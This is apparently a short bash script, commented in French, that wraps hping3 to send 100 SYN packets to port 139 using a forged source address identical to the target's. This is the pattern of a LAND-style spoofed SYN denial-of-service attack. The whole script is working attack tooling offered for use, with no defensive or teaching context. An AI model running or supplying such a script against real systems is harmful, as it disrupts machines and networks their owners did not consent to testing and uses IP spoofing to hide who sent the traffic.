#!/bin/bash

# Vérifier le nombre d'arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <port> <spoofed_ip>"
    exit 1
fi

# Récupérer les adresses IP à partir des arguments
port="$1"
spoofed_ip="$2"

# Utiliser hping3 avec les adresses IP spécifiées
hping3 -V -c 100 -d 40 -S -p 139 -s "$port" -k -a "$spoofed_ip" "$spoofed_ip"
